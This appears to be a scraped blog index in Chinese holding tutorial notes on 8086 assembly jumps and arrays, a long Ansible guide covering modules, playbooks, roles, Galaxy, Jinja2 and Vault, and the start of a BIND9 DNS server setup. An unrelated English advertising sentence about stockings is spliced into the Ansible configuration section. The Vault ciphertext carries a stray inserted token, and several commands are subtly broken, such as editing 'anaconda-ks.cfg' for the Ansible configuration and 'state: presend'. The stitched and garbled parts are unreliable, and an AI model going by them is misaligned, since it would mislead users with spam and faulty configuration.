start是执行完成之后还会回到start的最初位置。我们运行一下代码，查看这些数据是什么形式存储的首先开启程序之后CS和IP寄存器和原本的不一样，原因是因为之前的位置都存储了数据，通过d指令去查看原本位置的内容，我们的代码存储了字母，字母的存储方式为字母的ascii码的16进制，丢到里面，然后以知道bcdef，也就是076A:0030的位置，填充完后面还是跟随了很多0，然后紧接着是栈段的10个0，但是他这里存储的不仅仅是10个，除去ef，就是14+16个0，为什么会这样？因为每一个段不是通过偏移来设置位置的，而是通过CS，CS是必须被16整除的，也就是说如果细分到16以内的位置只能通过偏移来找，就是说基础单位就是16个，最终的数据如果是没撑满这16位，那么剩下的他都会不作为，并且依旧作为当前段的内容，包括上面定义的stack。所以实际数据段和栈段的范围是这样的上面的红框是数据段，下面的红框是栈段。\nOFFSET指令offset是只能在编写代码文件时使用的指令，他的作用是获取某个数据的位置，具体可以参考下面汇编代码\nassume cs:codecode segment    a: db 10 dup(10H)    b: db 10 dup(11H)    ; start: mov ax,offset a[0]    ; mov bx,offset b[0]    start: mov ax,offset a           mov bx,offset bcode endsend start\n直接查看内存中的内容，然后再去看要执行的内容，结果如下图写入了10个10和11，在执行MOV的时候对应的值也是这俩数据的偏移位置，这就是offset的作用，用来查找对应数据的偏移值。\nJMP指令进阶jmp的作用是跳转，上面也实践了一下，他还有很多其他写法，这里列举一下\n\njmp short 近跳转，通过修改IP来跳转偏移，偏移量是一个有符号的 8 位数，范围为 -128 到 +127 字节。\njump far ptr 远跳转，通过CS和IP来跳转，它可以实现很远的跳转。\njmp near ptr 这个跳转是拿到数值的2个字节来跳转\njmp dword ptr 这个跳转是拿到数值的4个字节来跳转\n\n具体举个他们的例子，汇编代码如下\nassume cs:codecode segment    start: jmp short a    ; 如果这里不注释这256个db则是跳转不过去的,大家可以自己尝试    ; 跳转不过去的原因是因为近跳转范围只有`-128`~`127`字节    ; db 256 dup(0)    a:         mov ax,1H        jmp far ptr b        db 256 dup(0)    b:         mov ax,cs        mov ds,ax        mov ax,offset c        mov ds:[0],ax        jmp word ptr ds:[0]    c:        mov ax,offset d        ; mov ds:[0],0000h        mov ds:[0],ax        mov ds:[2],cs        jmp dword ptr ds:[0]    d:         mov ax,0FFFFh        int 21hcode endsend start\n先看前3条执行过程，如下图，第一个jmp是采用一个偏移的方式，第二个jmp是采用一个地址段+偏移的方式我们继续运行，查看第三个jmp，如下图，第三个jmp直接跳转DS的0000位置的地址我们再去看一下这个DS:0000的内容，这个内容是什么那么他就会跳转到哪里，不出意外应该是在上图的倒数第三个位置，应该是0118，也就是C的偏移位置因为有高低位平衡，所以这里是1801，实际就是0118，那这个偏移位置的内容是什么呢？我们继续用u指令看一下很明显这里就是C函数的入口，并且D函数的入口也被C的第一条指令打进了DS:0000的位置，然后采用JMP去跳转，我们先看一下jmp之前的DS:0000的内容，是不是076A:0126，我们继续运行发现是没问题的，因为存在高低位平衡，所以是26016A07实际就是076A0126，分别指向下一个CS和IP的正确位置，我们继续运行程序成功退出结束。\nJCXZ指令JCXZ是一条条件跳转指令，它的功能是检查CX寄存器是否为零，如果CX寄存器等于零，则跳转到指定的目标地址；如果CX寄存器不等于零，则继续执行下一条指令。具体参考代码如下\nassume cs:codecode segment    mov ax, 2       ; AX初始值为2    mov cx, 11      ; CX设为11，表示循环11次a:      jcxz done       ; 如果CX为0，跳到done    add ax, ax      ; AX = AX + AX（AX乘以2）    dec cx          ; CX减1    jmp a           ; 无条件跳回a，继续循环done:               ; 循环结束    mov ah, 4Ch     ; 设置AH=4Ch，退出程序    int 21hcode endsend\n循环结束之后直接跳出了，这里需要一次性执行好多次t，可以自己修改代码，尝试个一两次知道怎么用就可以了。\nTYPE伪指令TYPE 可以用来查询某个变量的类型，返回其占用的字节数。简单举个例子，参考下面汇编代码\nassume cs:code, ds:datadata segment    var1 DB 10h         ; 定义一个字节变量    var2 DW 1234h       ; 定义一个字变量    var3 DD 0DEADBEEFh  ; 定义一个双字变量data endscode segmentstart:    mov ax, TYPE var1   ; AX = 1（var1 是字节）    mov bx, TYPE var2   ; BX = 2（var2 是字）    mov cx, TYPE var3   ; CX = 4（var3 是双字）    int 21hcode endsend start\n数组的读取和写入在代码段中读取和写入数组，直接上汇编代码，如下\nassume cs:code,ds:data,ss:stackdata segmentdata endsstack segment    db 10 dup (0)stack endscode segment    arr db 12,34,56,78,9AH    start:            mov al,arr[2]           mov al,arr[4]           mov ax,word ptr arr[2]           mov si,offset arr           mov al,cs:[si+4]            mov al,cs:[si+6]code endsend start\n我们看一下每个mov执行实际给的内容，如下图上面是执行了4次，我们挨个看内容，第一个把al设置成了数组中的第二个数据也就是56，56的16进制刚好为38，然后他继续去拿第四个位置的内容是9A，咱们定义的时候也是直接的16进制的9A，所以这里也是没问题的，然后有执行了一个ax为第二个内容，但是这里为什么是4e38呢？其实这里也是对的，通过d命令去查看这个位置的确就是这个内容。我们继续运行，查看内容si拿到的数据是arr的0位偏移，也就是0000，这里拿到的内容也都是预期的。上面的例子是基于代码段来去操作数据，下面来一个不同段的，原理都一样，主要是这里多了一个修改DS地址的指令，主要参考与下面汇编代码\nassume cs:code,ds:data,ss:stackdata segment    arr db 10H,20H,30H,40H,50H    arr2 db &#x27;hello world&#x27;data endsstack segment    db 10 dup (0)stack endscode segment    start:         mov ax,data        mov ds,ax                mov al,arr[2]code endsend start\n我们执行以下看一下al的数据，如下图还有一些额外写法都可以参考上面代码段中使用数组的汇编代码，这里DS修改之后就全都对的上了。然后如果数组不加[]那么他就是直接引用0的偏移位置。\n写在后面上面均为自己学习整理的笔记，仅限参考，也欢迎大佬指出错误，非常感谢。\n","categories":["开发相关","asm"],"tags":["asm"]},{"title":"Ansible-自动化运维工具","url":"/2022/03/05/Ansible-%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E5%B7%A5%E5%85%B7/","content":"概述Ansible 是一个极其简单的 IT 自动化平台，可让您的应用程序和系统更易于部署和维护。从代码部署到网络配置再到云管理，使用一种接近简单英语的语言，使用 SSH 实现一切自动化，无需在远程系统上安装代理。\nGitHub: github.com&#x2F;ansible&#x2F;ansibleAnsible官网: www.ansible.com\n安装配置和使用安装配置好扩展源(epel-release)就可以使用yum安装了\nyum -y install ansible\n\n配置Ansible的stockings are not only beautiful but also practical. They are made from a high-quality material that is both comfortable and durable. The stockings are available in a variety of colors and patterns, so you can find the perfect pair to match your style.\nAnsible的配置文件存在优先级问题,默认状态下会使用/etc/ansible/ansible.cfg具体优先级关系如下：\n最高优先级是执行命令的当前目录下\n\n./ansible.cfg\n\n如果当前目录下找不到配置文件就会查找执行用户的家目录寻找\n\n~/.ansible.cfg\n\n以上位置就会选择默认的配置文件\n\n/etc/ansible/ansible.cfg\n\n[root@host ~]# cp /etc/ansible/ansible.cfg ~/.ansible.cfg[root@host ~]# vim ./anaconda-ks.cfg//找到defaults段，这段不取消注释则采用默认配置，下面的参数可以自己配置inventory    /etc/ansible/hosts  //主机清单文件路径roles_path   /etc/ansible/roles  //role存放目录remote_user  root                //执行命令的用户//找到privilege_escalation段，这一块主要是和耍权相关这里取不取消注释无所谓可以按照自己环境来修改become=True                      //是否开启提权become_method=sudo               //定义执行方式become_user=root                 //定义执行用户become_ask_pass=False            //定义提示密码\n\n使用配置hosts主机文件\n使用的时候需要定义host主机文件，里面是存放被控主机的ip地址，建议必须是使用可以ssh免密登录的主机。\n[root@host ~]# echo &quot;&quot; &gt; /etc/ansible/hosts           //清除hosts主机文件[root@host ~]# vim /etc/ansible/hosts                //编辑hosts主机文件，并向里面添加主机[host]192.168.1.112[host2]192.168.1.113\n\nhosts主机还有多种写法，具体请看本文的其他栏ps:写好主机文件之后的操作需要建立在ssh免密之后才可以执行，具体方法可以看文章的其他栏，有问题欢迎在评论区提问\n简单使用方法如下\n[root@host ~]# ansible all --list   //列出所有主机  hosts (2):    192.168.1.112    192.168.1.113[root@host ~]# ansible all -m ping     //验证全部主机的连通性192.168.1.112 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;192.168.1.113 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;\n\n常用模块使用方法[root@host ~]# ansible 组/主机 -m 模块 //使用-m参数来指定相应模块\n\n模块使用文档ansible为每个模块都提供了文档使用命令ansible-doc -l 可以列出全部的ansible模块使用命令ansible-doc &#123;模块名称&#125;   可以查看对应模块的帮助文档\nping模块测试主机的连通性直接使命令:ansible 主机/组 -m ping\n[root@host ~]# ansible all -m ping192.168.1.113 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;192.168.1.112 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;\n\n返回pong则证明连通性没问题\nshell&#x2F;command模块执行命令直接使命令:ansible 主机/组 -m shell/command -a &quot;执行的命令&quot;\n[root@host ~]# ansible all -m shell -a &quot;ping baidu.com -c 1&quot;192.168.1.113 | CHANGED | rc=0 &gt;&gt;PING baidu.com (220.181.38.148) 56(84) bytes of data.64 bytes from 220.181.38.148 (220.181.38.148): icmp_seq=1 ttl=50 time=18.5 ms--- baidu.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 18.489/18.489/18.489/0.000 ms192.168.1.112 | CHANGED | rc=0 &gt;&gt;PING baidu.com (220.181.38.148) 56(84) bytes of data.64 bytes from 220.181.38.148 (220.181.38.148): icmp_seq=1 ttl=50 time=17.6 ms--- baidu.com ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 17.597/17.597/17.597/0.000 ms\n\nShell和Command都是执行命令 但是两者有一定的区别Command该模块命令里如果有一下字符部分执行不成功 “&lt;” “&gt;” “|” “&amp;””;”Shell用法基本和command一样 不过时通过&#x2F;bin&#x2F;sh进行执行,所以shell模块可以执行任何命令,就像在本机执行命令一样,但是这样有潜在的shell注入的风险两个模块都要避免使用,你应该优先考虑ansible的模块其他参数可以查看ansible-doc来详细学习\nScript模块主要用于执行管理主机上的脚本 原理就是将shell复制到远程主机,再远程主机上执行使用命令:ansible 主机/组 -m script -a &quot;控制端的脚本&quot;\n[root@host ~]# echo &quot;echo hello,world&quot; &gt; 1.sh [root@host ~]# ansible all -m script -a &#x27;./1.sh&#x27;192.168.1.112 | CHANGED =&gt; &#123;    &quot;changed&quot;: true,    &quot;rc&quot;: 0,    &quot;stderr&quot;: &quot;Shared connection to 192.168.1.112 closed.\\r\\n&quot;,    &quot;stderr_lines&quot;: [        &quot;Shared connection to 192.168.1.112 closed.&quot;    ],    &quot;stdout&quot;: &quot;hello,world\\r\\n&quot;,    &quot;stdout_lines&quot;: [         &quot;hello,world&quot;    ]&#125;192.168.1.113 | CHANGED =&gt; &#123;    &quot;changed&quot;: true,    &quot;rc&quot;: 0,    &quot;stderr&quot;: &quot;Shared connection to 192.168.1.113 closed.\\r\\n&quot;,    &quot;stderr_lines&quot;: [        &quot;Shared connection to 192.168.1.113 closed.&quot;    ],    &quot;stdout&quot;: &quot;hello,world\\r\\n&quot;,    &quot;stdout_lines&quot;: [        &quot;hello,world&quot;    ]&#125;\n\nStdout_lines参数就是实际机器返回的值其他参数可以查看ansible-doc来详细学习\nuser模块主要用于管理用户使用命令：ansible 主机/组 -m user -a &#39;参数&#39;添加一个用户ansible 主机/组 -m user -a ‘name=admin state=present’state可以理解为动作 增加删除修改 默认state就是present\n[root@host ~]# ansible all -m user -a &quot;name=admin state=present&quot;192.168.0.103 | CHANGED =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: true,    &quot;comment&quot;: &quot;&quot;,    &quot;create_home&quot;: true,    &quot;group&quot;: 1000,    &quot;home&quot;: &quot;/home/admin&quot;,    &quot;name&quot;: &quot;admin&quot;,    &quot;shell&quot;: &quot;/bin/bash&quot;,    &quot;state&quot;: &quot;present&quot;,    &quot;system&quot;: false,    &quot;uid&quot;: 1000&#125;\n\n使用命令：ansible 主机/组 -m user -a ‘name=admin state=absent’ 可以删除admin用户\n[root@host ~]# ansible all -m user -a &quot;name=admin state=absent&quot;192.168.0.103 | CHANGED =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: true,    &quot;force&quot;: false,    &quot;name&quot;: &quot;admin&quot;,    &quot;remove&quot;: false,    &quot;state&quot;: &quot;absent&quot;&#125;\n\n其他可以查看ansible-doc来详细学习\nyum_repository模块主要用于批量更新yum源ansible 主机/组 -m yum_repository -a &#39;参数&#39;ansible 主机/组 -m yum_repository -a &#39;name=&quot;CentOS&quot; description=&quot;CentOS&quot; baseurl=&quot;file:///mntcdrom&quot; enabled=yes gpgcheck=no&#39;\n\nname 设置了文件名和文件中[]的内容\ndescription 设置了文件中name的内容\nbaseurl 设置了文件中源的地址\nenabled 设置了enable参数\ngpgcheck 设置了是否需要密钥来验证包\n\n[root@host ~]# ansible all -m yum_repository -a &#x27;name=&quot;CentOS&quot; description=&quot;CentOS&quot; baseurl=&quot;file:///mntcdrom&quot; enabled=yes gpgcheck=no&#x27;192.168.0.103 | CHANGED =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/libexec/platform-python&quot;    &#125;,    &quot;changed&quot;: true,    &quot;repo&quot;: &quot;CentOS&quot;,    &quot;state&quot;: &quot;present&quot;&#125;[root@host ~]# ssh root@192.168.0.103Last login: Sun Apr  3 12:20:11 2022 from 192.168.0.102[root@localhost ~]# cat /etc/yum.repos.d/CentOS.repo[CentOS]baseurl = file:///mntcdromenabled = 1gpgcheck = 0name = CentOS\n\n他会在对控制主机里生成相应的yum源配置文件还有很多参数可以用ansible-doc yum_repository来查看文档\nyum模块主要是用来操作yum的ansible 主机/组 -m yum -a ‘参数’参数详解\n\nName 包名\nState 选择是安装还是删除还是更新(present和installed是安装 latest是更新 removed和absent是移除)\n\n这是基本使用 还有很多参数详情请使用ansible-doc yum查看\ncopy模块主要是用来批量传输文件的ansible 主机/组 -m copy -a ‘参数’\n\nsrc 写本地目录\ndest 客户端目录\n\n其他请使用ansible-doc copy查看\nservice模块主要是用来管理服务用的ansible 主机/组 -m service -a ‘参数’\n\nname 包名\nstate 设置状态(started开启 stopped关闭 restarted重启 reloaded重置)\nenabled 参数只有yes和no yes为开机自启 no就是开机不开启\n\n其他请使用ansible-doc service查看\nset-up模块主要是用来显示对应主机的facts变量的，写roles文件用的比较多ansible 主机/组 -m setup -a ‘参数’用来显示对应主机的facts变量使用参数 filter=’*关键词* 可以进行显示检索具体请使用ansible-doc setup来查看\nfirewalld模块用来管理firewalld防护墙ansible 主机/组 -m firewalld -a ‘参数’参数：\n\nService 设置服务名称\nPermanent 是否永久更改(yes,no)\nState 是否放行(enabled,disabled)\nZone 选择区域\nPort 设置端口(&#x2F;tcp,&#x2F;udp)\n\n其他具体请使用ansible-doc firewalld来查看\ntemplate模块主要是用来复制jnja2文件的，jnja2文件后面会讲ansible 主机/组 –m template -a ‘参数’\n\nsrc 文件目录\ndest 复制后的文件目录\n\n其他参数请使用ansible-doc template查看\ndebug模块主要是用来debug的输出信息ansible 主机/组 -m debug -a ‘参数’\n\nmsg 输出内容\nvar 输出变量\n\n其他请使用ansible-doc debug查看\nPlaybook剧本Playbook剧本 类似和脚本一样 用来批量执行模块\n使用palybookPlaybook有着严格的缩进写法,语法非常严谨,使用yml文件来写\n[root@host test]# cat creatuser.yml---- name: create user  hosts: 192.168.0.103  tasks:  - name: create admin    user:      name: admin      state: present\n\n开头必须使用---一个-代表一个任务的开头如果一个块需要配置子参数则就需要严格缩进name是描述Hosts是主机清单Tasks是配置任务子任务中name是描述User则就代表user模块模块的子参数就不需要-了name则是user的配置参数运行playbook的命令是ansible-playbook palybook文件这是执行除此之外还可以使用命令&quot;ansible-playbook  --syntax-check 文件&quot;来检查文件语法是否有误还有命令&quot;ansible-playbook -C 文件&quot;来运行测试，他会使用文件进行运行测试但不会在目的主机上发生实际改变\n变量变量的名称必须以字母开头,并且只能含有字母,数字和下划线.通过vars声明变量通过&quot;&#123;&#123;变量名&#125;&#125;&quot;进行调用左边的就是使用变量写的,右边就是没用.实质效果一样也可以通过指定一个变量文件来实现 参数:vars_files:文件名我这边定义的是相对目录下的vars.yml 然后图的右边就是vars.yml文件的内容\n魔法变量魔法变量是ansible的内置变量,直接被定义好的,可以直接拿来使用.常见的魔法变量:\n\nhostvars 列出所有受管理的主机信息.啊如果没有收集facts信息则不会显示facts信息\ngroup_names 列出当前受管理主机所属的所有组\ngroups 列出清单中所有组的字典&#x2F;映射\ninventory_hostname 列出清单中所有配置的当前主机名称\n\n其他的可以使用setup模块进行查看\nFacts变量Facts变量用于采集客户端的信息,比如网络信息,主机名,硬件信息等.每次执行playbook时会对客户端主机进行数据采集实际上它是通过setup模块进行收集数据Ansible 主机/组 -m setup可以列出所有的facts变量\nWhen判断When就是判断 他只会判断某一条是否为true 否则跳过 可以理解为判断一个布尔类型When虽然不是一个模块但是他的缩进必须和模块对其 卸载tasks后面\n---- name: create user  hosts: 192.168.0.104  vars:    run: true  tasks:  - name: create user    user:      name: admin      state: present    when: run\n\n这是单条的判断 when会判断上面的值是否为true 是则执行不是则跳过\n---- name: create user  hosts: 192.168.0.104  tasks:  - name: create user    user:      name: admin      state: presend    when:      - ansible_distribution == &quot;CentOS&quot; and ansible_machine == &quot;x86_64&quot;      - ansible_distribution == &quot;CentOS&quot; and ansible_machine == &quot;RedHat&quot;\n\n里面的两个值都是facts的变量,只有满足CentOS系统内核为x86和redhat的系统才会执行,否则跳过只有满足CentOS系统内核为x86和redhat的系统才会执行 否则跳过常用判断语句\n==        等于&lt;         小于&gt;         大于&lt;=        小于等于&gt;=        大于等于!=        不等于is defined        变量是否定义,定义为true 未定义为falseis not defined    变量是否定义,未定义为false\n\n魔法变量判断\nwhen: inventory_hostname in groups[&quot;VMhost&quot;]\n\n只有VMhost组中主机才会执行此操作\nLoop循环---- name: create user  hosts: 192.168.0.104  tasks:  - name: create user    user:      name: &quot;&#123;&#123;item.name&#125;&#125;&quot;      uid: &quot;&#123;&#123;item.uid&#125;&#125;&quot;      state: presend    loop:      - name: admin1        uid: 3001      - name: admin2        uid: 3002      - name: admin3        uid: 3003\n\nItem是循环变量 只要用loop循环执行变量就必须使用item 点的后面使用loop定义的内容 循环的开始都要用 – 表示\nBlock块Ansble的playbook可以把多个和任务组成一个块,然后根据不同条件来执行这个块还能执行失败时执行其他命令Block 定义块 写的时候要求和任务(tasks)的name对齐Rescue 当上面的块执行失败时,该关键字下麦呢的任务将被执行Always 不管block是否执行成功之后都会执行这个任务\n---- name: cat file  hosts: 192.168.0.104  tasks:    - name: cat a.txt      block:        - debug:            msg: &quot;查看文件&quot;        - shell: cat /1.txt      rescue:        - debug:            msg: &quot;我giao,查看失败,创建文件&quot;        - shell: echo hello,world &gt; /1.txt        - debug:            msg: &quot;查看文件&quot;        - shell: cat /1.txt      always:        - debug:            msg: &quot;执行完成&quot;\n\n如下执行结果\nregister命令返回以上一个block为例子,给他改一些东西\n---- name: cat file  hosts: 192.168.0.104  tasks:    - name: cat a.txt      block:        - debug:            msg: &quot;查看文件&quot;        - shell: cat /1.txt        - debug:            var: cattxt          register: cattxt      rescue:        - debug:            msg: &quot;我giao,查看失败,创建文件&quot;        - shell: echo hello,world &gt; /1.txt        - debug:            msg: &quot;查看文件&quot;        - shell: cat /1.txt      always:        - debug:            msg: &quot;执行完成&quot;\n\n执行结果如下\nRoles角色介绍Ansible roles提供了便捷的方式让你能够轻松的重复利用ansible代码 可以在标准化的目录结构中大伯所有 任务 变量 文件 模板以及完成任务所需要的资源,这样我们只需要将roles从一个项目复制到另一个项目即可在play中直接调用并执行他从第二排开始就是roles的文件 文件中包含很多项目就是第三排的内容 然后第四行就是每个项目中的子目录 这几个子目录都有自己的作用\nRoles子目录Default: 此目录中main.yml文件定义新角色变量的默认值,该目录中定义的优先级较低,使用角色时可以覆盖这些变量Files: 存放角色任务中引用的静态文件Handlers: 此目录中main.yml 文件定义处理程序Meta: 此目录中main.yml 文件定义角色相关信息 如:作者,平台,依赖等等Tasks: 此目录中main.yml 文件定义角色中的任务Templates: 存放jinja2的模板文件Tests: 此目录中可以包含清单和test.yml(playbook)用于测试角色Vars: 此目录中main.yml文件定义角色使用的变量值,优先级高于default目录  \nGalaxyGalax是ansible的一个功能库 你可以使用其他人创建好的roles也可以分享自己的roles.就像docker镜像库一样 需要什么功能就可以直接去下载使用官方网站：https://galaxy.ansible.comAnsible-galaxy install 包名默认安装会的话会自动安装到~/.ansible/roles/下 可以使用-p参数指定位置然后参数init可以自动生成roles目录Ansible-galaxy init 文件夹名字参数 -r 可以执行yml下载文件例如\n---- src: roles文件地  name: 下载后的本地昵称- src: roles文件地址  name: 下载后的本地昵称\n\n安装的时候可以使用命令Ansible-galaxy install -r yml.yml 进行下载装好的角色可以使用ansible-galaxy list查看\nJ2详解J2全名为jinja2是python下一个被广泛运用的模板引擎,他的设计思想来源于Django的模板引擎,并拓展了其他语法和一系列强大的功能,ansible使用jinja2模板来启用动态表达式和访问变量。\n构成Jinja2模板的构成：数据 变量 表达式在使用jinja2模板时变量和表达式会被替代成对应的值,变量的值可以在plasybook中定义也可以直接调用facts事实,当然调用facts需要你编写的playbook开启了facts收集 \n写法- `&#123;&#123;EXPR&#125;&#125;` 用于装载表达式,比如变量,运算表达式,比较表达式- `&#123;%EXPR%&#125;` 用于装载控制语句 比如`if`,`for`等- `&#123;# #&#125;` 用于注释\n\nPs:jinja2模板文件本身不需要指定文件扩展名,使用.j2为后缀名只是为了更方便我们管理jinja2的模板\n创建和使用角色使用命令&quot;ansible-galaxy init galaxy&quot;创建一个galaxy模板\n[root@Ansible roles]# ansible-galaxy init galaxy- Role galaxy was created successfully[root@Ansible roles]# lsgalaxy[root@Ansible roles]# cd galaxy/[root@Ansible galaxy]# lsdefaults  files  handlers  meta  README.md  tasks  templates  tests  vars\n\n编辑tasks的main.yml文件写入以下内容\n---# tasks file for galaxy- name: install apache  yum:    name: httpd- name: start httpd  service:    name: &quot;&#123;&#123;item&#125;&#125;&quot;    state: started    enabled: yes  loop:    - httpd    - firewalld- name: set firewalld  firewalld:    service: http    permanent: yes    state: enabled    immediate: yes- name: set index  template:    src: index.html.j2    dest: /var/www/html/index.html\n\ntasks/main.yml文件只需要定义命令,不需要定义主机上面这个main文件是使用yum下载了一个httpd之后使用service开启了防火墙和httpd的服务，又实用防火墙模块放行了对应的服务，之后把j2文件复制到了对应的网站目录页面。之后写一个j2文件放到templates目录里，内容如下\n[root@Ansible galaxy]# cat templates/index.html.j2Welcome to &#123;&#123;ansible_default_ipv4.address&#125;&#125;\n\nansible_default_ipv4.address是facts变量中对应主机的ip写好之后我们来写一个playbook来运行写的roles\n---- name: roles galaxy  hosts: 192.168.0.104  roles:    - /root/ansible/roles/galaxy\n\n运行结果如下，通过http访问返回内容\nVault加密场景使用ansible的时候难免会有一些比较敏感的数据，比如密码，key等信息直接明文暴露显然不是很好，vault管理加密&#x2F;解密yml(palybook)文件工具，有时编写的playbook文件中会存在重要敏感信息,考虑到安全,可以使用此工具进行加密!\n参数详解Ansible-vault [参数] [文件]\n\nCreate: 创建\nDecrypt: 解密\nEdit: 编辑加密文件\nEncrypt: 加密\nrekey: 修改口令\nview: 查看\n\n加密之后执行playbook的时候需要附加–ask-vault-pass参数\n实例创建用户，用户信息使用vault进行加密，使其不能以明文的形式查看\n[root@Ansible ansible]# cat vault.yml---- name: vault  vars_file: ./userinfo.yml  tasks:    - name: create user      user:        name: &quot;&#123;&#123;name&#125;&#125;&quot;        password: &quot;&#123;&#123;password&#125;&#125;&quot;[root@Ansible ansible]# cat userinfo.yml---- name: &quot;admin&quot;  password: &quot;abc123&quot;[root@Ansible ansible]# ansible-vault encrypt userinfo.ymlNew Vault password:Confirm New Vault password:Encryption successful[root@Ansible ansible]# cat userinfo.yml$ANSIBLE_VAULT;1.1;AES256633562393830393962633237323966633331326165613233626366623832656262336434653763653838633930316666373234633533643065643238653239380a31353063376336626264313536333662386533313439393761353966316534323464326533306564363565623737393766316231383035636 NXT1366533837320a316465306139373564623930303330623261343466366336653537333266613863303363633666336336323034656135353037666536633637346631383930646462373630633431616565353131633931326531383262353234366131306130\n\n执行需要使用参数 &quot;–ask-vault-pass&quot; 执行\n其他hosts主机文件写法一般写法:\n[组名]IP域名······\n\n连续主机写法:\n[组名]1[a-f].example.com······\n\n父组写法:\n[组名:children]组名组名······\n","categories":["工具相关"],"tags":["开源工具","Ansible","自动化"]},{"title":"BIND9-DNS服务器配置","url":"/2022/01/21/BIND9-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"DNSDNS是将域名解析成IP地址的协议，有的时候也用于将IP地址反向解析成域名，也可以实现双向的解析。当客户端使用域名时会向DNS服务器发送请求，DNS会返回相应的IP给客户端之后客户端在向对应的IP发起请求。\n域名域名是网络上用于网络域、计算机、服务器等网络设备地址的标识。域名的结构如下图结构: 域名是分层管理的,最高层的域名是根域”.”就是一个点”.”。根域: 全世界只有13组根服务器，名字分别为A至M，其中10台设置在美国，另外三台设置于英国、瑞典、日本。顶级域名是由ICANN委任的注册机构负责运行。二级域名: 二级域名不需要到ICANN进行申请，只需要到顶级域名的注册机构去检查带申请的名字是否可用，并且不是别人的商标时只需要缴纳一笔一年的费用即可得到相应的域名。\nBIND9BIND9是用于搭建DNS服务器的一个软件应用。\n安装[root@localhost ~]# yum -y install bind[root@localhost ~]# named -vBIND 9.11.26-RedHat-9.11.26-6.el8 (Extended Support Version) &lt;id:3ff8620&gt;\n\n主配置主配置文件为/etc/named.conf\n//// named.conf//// Provided by Red Hat bind package to configure the ISC BIND named(8) DNS// server as a caching only nameserver (as a localhost DNS resolver only).//// See /usr/share/doc/bind*/sample/ for example named configuration files.//options &#123;        listen-on port 53 &#123; 127.0.0.1; &#125;;    //监听的ipv4端口以及ip，需要改成自己的主机ip        listen-on-v6 port 53 &#123; ::1; &#125;;    //监听的ipv6端口以及ip，改成自己的ipv6地址。用不到可以直注释掉        directory       &quot;/var/named&quot;;    //区域文件存放位置        dump-file       &quot;/var/named/data/cache_dump.db&quot;;    //当执行rndc dumpdb时服务器存放数据库文件路径名        statistics-file &quot;/var/named/data/named_stats.txt&quot;;    //当执行rndc stats命令的时候,服务器会统计信息追加到的文件路径        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;    //服务器输出的内存使用统计文件路径        secroots-file   &quot;/var/named/data/named.secroots&quot;;    //安全根的保存位置        recursing-file  &quot;/var/named/data/named.recursing&quot;;    //递归查询数据的保存位置        allow-query     &#123; localhost; &#125;;    //允许查询的ip,需要改为any        /*         - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.         - If you are building a RECURSIVE (caching) DNS server, you need to enable           recursion.         - If your recursive DNS server has a public IP address, you MUST enable access           control to limit queries to your legitimate users. Failing to do so will           cause your server to become part of large scale DNS amplification           attacks. Implementing BCP38 within your network would greatly           reduce such attack surface        */        recursion yes;    //允许递归查询        dnssec-enable yes;    //开启dnssec        dnssec-validation yes;    //设置dnssec在递归查询服务器上开启        managed-keys-directory &quot;/var/named/dynamic&quot;;    //指定目录中的文件储存,跟踪管理DNSSEC密钥        pid-file &quot;/run/named/named.pid&quot;;    //pid文件路径        session-keyfile &quot;/run/named/session.key&quot;;    //会话密钥路径        /* https://fedoraproject.org/wiki/Changes/CryptoPolicy */        include &quot;/etc/crypto-policies/back-ends/bind.config&quot;;&#125;;// 日志相关内容logging &#123;        channel default_debug &#123;                file &quot;data/named.run&quot;;                severity dynamic;        &#125;;&#125;;//定义了根区域，没事可以看一下他这个区域文件(/var/named/named.ca)，里面配置了13个根主机以及ipv4的地址还有ipv6的地址zone &quot;.&quot; IN &#123;        type hint;        file &quot;named.ca&quot;;&#125;;include &quot;/etc/named.rfc1912.zones&quot;;    //标注的文件也作为配置生效，这个一般用于存放区域的配置include &quot;/etc/named.root.key&quot;;    //标注的文件也作为配置生效\n这个文件里面暂只需要修改的配置已列出：\n\nlisten-on port 53 &#123; 服务器的IP; &#125;;    &#x2F;&#x2F;监听的ipv4端口以及ip，需要改成自己的主机ip\nallow-query     &#123; any; &#125;;    &#x2F;&#x2F;允许查询的ip,需要改为any其他配置看自己需求来\n\n各种类型的记录SOA记录: 起始授权记录 表示一个授权区域的开始NS记录: 标识一个域的域名服务器A记录: 将主机名转换为ipv4地址AAAA记录: 将主机名转换为ipv6地址CNAME记录: 别名记录 解析域名MX记录: 邮件交换记录PTR记录: 将地址转换成域名 反向解析\n配置一个正向解析域编辑区域文件/etc/named.rfc1912.zones在最底下添加内容\n[root@localhost ~]# tail -n5 /etc/named.rfc1912.zoneszone &quot;host.com.&quot; IN &#123;        type master;        file &quot;host.com.zone&quot;;        allow-update &#123; none; &#125;;&#125;;\nzone: 定义一个区域写法为 zone &quot;域名.&quot; IN &#123;配置&#125;type: 